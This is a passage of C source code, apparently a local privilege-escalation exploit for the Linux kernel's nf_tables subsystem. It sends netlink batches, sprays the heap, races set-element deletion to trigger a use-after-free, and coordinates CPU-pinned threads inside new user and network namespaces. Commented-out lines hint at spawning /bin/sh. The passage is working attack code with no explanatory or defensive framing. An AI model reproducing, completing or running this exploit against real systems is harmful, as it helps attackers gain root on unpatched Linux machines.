        NFT_MSG_DELSETELEM,
        NFPROTO_INET,
        NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
        seq++
    );
    nftnl_set_elems_nlmsg_build_payload(nlh, set);
    mnl_nlmsg_batch_next(batch);

    nftnl_set_free(set);
    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    portid = mnl_socket_get_portid(nl);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "Cannot into mnl_socket_sendto()");
    }

    mnl_nlmsg_batch_stop(batch);
}

static int pwn_main()
{
    int res;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(1337);
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    struct mnl_socket *nl = mnl_socket_open(NETLINK_NETFILTER);
    if (nl == NULL) {
        err(1, "Cannot into mnl_socket_open()");
    }

    if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
        err(1, "Cannot into mnl_socket_bind()");
    }

    memset(log_prefix, 'A', sizeof(log_prefix));
    log_prefix[uaf_chunk_size - 2] = 0;

    pwn_prepare(nl);

    usleep(cfg_initial_usleep);

    pwn_uaf_spray(nl);

    pwn_delay_spray_set(nl);
    uint64_t race_set_elem_key = 0;
    while (race_set_elem_key < cfg_race_set_elem_count) {
        pwn_delay_spray_set_elem(nl, &race_set_elem_key, cfg_race_set_elem_count);
    }

    pwn_uaf_trigger(nl);
    return 0;
}


static void netdevice_up(char *name)
{
    int res;

    int connection = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    if (connection == -1) {
        err(1, "Cannot into socket()");
    }

    struct ifreq ifreq;
    memset(&ifreq, 0, sizeof(ifreq));
    snprintf(ifreq.ifr_name, IF_NAMESIZE, "%s", name);

    res = ioctl(connection, SIOCGIFFLAGS, &ifreq);
    if (res == -1) {
        err(1, "Cannot into ioctl()");
    }

    ifreq.ifr_flags |= (IFF_UP | IFF_RUNNING);

    res = ioctl(connection, SIOCSIFFLAGS, &ifreq);
    if (res == -1) {
        err(1, "Cannot into ioctl()");
    }

    res = close(connection);
    if (res != 0) {
        err(1, "Cannot into close()");
    }
}


volatile int cpu_spinning = 1;


static void pwn(size_t cpu_set_size, const cpu_set_t *cpu_set, int socketfd)
{
    int res;

    res = sched_setaffinity(0, cpu_set_size, cpu_set);
    if (res != 0) {
        err(1, "Cannot into sched_setaffinity()");
    }

    netdevice_up("lo");

    int status = pwn_main();

    res = write(socketfd, &status, sizeof(status));
    if (res != sizeof(status)) {
        err(1, "Cannot into write()");
    }

    while (cpu_spinning) {
        usleep(60 * 1000 * 1000);
    }
}


/****************************************************************************
 *
 * Coordinator
 *
 */


static int clone_helper(void *ctx)
{
    jmp_buf *env = ctx;

    longjmp(*env, 1);
    err(1, "Cannot into pthread_attr_init()");
    return 1;
}


__attribute__((noinline))
static pid_t clone_with_longjmp(unsigned long flags, jmp_buf *env)
{
    char helper_stack_buffer[2 * PTHREAD_STACK_MIN + __BIGGEST_ALIGNMENT__];

    uintptr_t helper_stack_addr = (uintptr_t) helper_stack_buffer;
    helper_stack_addr += PTHREAD_STACK_MIN + __BIGGEST_ALIGNMENT__ - 1;
    helper_stack_addr -= helper_stack_addr % __BIGGEST_ALIGNMENT__;
    void *helper_stack = (void *) helper_stack_addr;

    pid_t pid = clone(clone_helper, helper_stack, flags, env);
    if (pid == -1) {
        err(1, "Cannot into clone()");
    }

    return pid;
}


static void *cpu_spinning_loop(void *)
{
    while (cpu_spinning) {
    }

    return NULL;
}


static void thread_create_with_affinity(pthread_t *thread,
    size_t cpu_set_size, const cpu_set_t *cpu_set,
    void *(*start_routine) (void *), void *arg)
{
    pthread_attr_t attr;
    int res;

    res = pthread_attr_init(&attr);
    if (res != 0) {
        err(1, "Cannot into pthread_attr_init()");
    }
    res = pthread_attr_setaffinity_np(&attr, cpu_set_size, cpu_set);
    if (res != 0) {
        err(1, "Cannot into pthread_attr_setaffinity_np()");
    }
    res = pthread_create(thread, &attr, start_routine, arg);
    if (res != 0) {
        err(1, "Cannot into pthread_create()");
    }
    res = pthread_attr_destroy(&attr);
    if (res != 0) {
        err(1, "Cannot into pthread_attr_destroy()");
    }
}


static void pwn_helper(size_t cpu_set_size, const cpu_set_t *cpu_set)
    //char *target_path, char *target_argv[], char *target_envp[])
{
    int res;

    int socketfd[2];
    res = socketpair(AF_UNIX, SOCK_STREAM, 0, socketfd);
    if (res != 0) {
        err(1, "Cannot into socketpair()");
    }

    pid_t pwn_pid = -1;
    jmp_buf env;
    if (setjmp(env) == 0) {
        pwn_pid = clone_with_longjmp(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET | SIGCHLD, &env);
    }
    else {
        res = close(socketfd[0]);
        if (res != 0) {
            err(1, "Cannot into close()");
        }

        char buf[1];
        res = read(socketfd[1], buf, sizeof(buf));
        if (res != sizeof(buf)) {
            err(1, "Cannot into read()");
        }

        pwn(cpu_set_size, cpu_set, socketfd[1]);
        err(1, "Unexpected return from exploit()");
    }

    res = close(socketfd[1]);
    if (res != 0) {
        err(1, "Cannot into close()");
    }

    umask(0022);
    
    char buf[1] = {};
    res = write(socketfd[0], buf, sizeof(buf));
    if (res != sizeof(buf)) {
        err(1, "Cannot into write()");
    }

    int status = EFAULT;
    res = read(socketfd[0], &status, sizeof(status));
    if (res != sizeof(status)) {
        err(1, "Cannot into read()");
    }
    if (status == EAGAIN) {
        return;
    }
}


static void exploit()//char *target_path, char *target_argv[], char *target_envp[])
{
    int cpu_alloc = 0x80;
    cpu_set_t *cpu_set;
    size_t cpu_set_size;
    int res;


    cfg_load("profile");

    /* see https://github.com/linux-test-project/ltp/blob/master/testcases/kernel/syscalls/getcpu/getcpu01.c */
    while (1) {
        cpu_alloc <<= 1;
        cpu_set = CPU_ALLOC(cpu_alloc);
        if (cpu_set == NULL) {
            err(1, "Cannot into CPU_ALLOC()");
        }
        cpu_set_size = CPU_ALLOC_SIZE(cpu_alloc);

        CPU_ZERO_S(cpu_set_size, cpu_set);
        res = sched_getaffinity(0, cpu_set_size, cpu_set);
        if (res == 0) {
            break;
        }
        else if (errno != EINVAL) {
            err(1, "Cannot into sched_getaffinity()");
        }
    }

    cpu_set_t *cpu_affinity = CPU_ALLOC(cpu_alloc);
    if (cpu_affinity == NULL) {
        err(1, "Cannot into CPU_ALLOC()");
    }
    CPU_ZERO_S(cpu_set_size, cpu_affinity);

    int pwn_cpu = -1;
    for (int cpu = 0; cpu < cpu_set_size * 8; ++ cpu) {
        if (CPU_ISSET_S(cpu, cpu_set_size, cpu_set)) {
            if (pwn_cpu == -1) {
                pwn_cpu = cpu;
            }
            else {
                pthread_t thread;

                CPU_SET_S(cpu, cpu_set_size, cpu_affinity);
                thread_create_with_affinity(&thread,
                    cpu_set_size,
                    cpu_affinity,
                    cpu_spinning_loop,
                    NULL
                );
                CPU_CLR_S(cpu, cpu_set_size, cpu_affinity);
            }
        }
    }

    CPU_SET_S(pwn_cpu, cpu_set_size, cpu_affinity);
    for (int attempt = 0; attempt < 5; ++ attempt) {
        pwn_helper(cpu_set_size, cpu_affinity);//, target_path, target_argv, target_envp);
    }
}

int main(int argc, char *argv[], char *envp[])
{
    setbuf(stdout, NULL);

    char *target_path;
    if (2 <= argc) {
        target_path = argv[1];
    }
    else {
        target_path = realpath(argv[0], NULL);
        if (target_path == NULL) {
            err(1, "Cannot into realpath()");
        }
    }
    //char *target_argv[] = { "-", "-", "/bin/sh", NULL };
    exploit();//target_path, target_argv, envp);
}
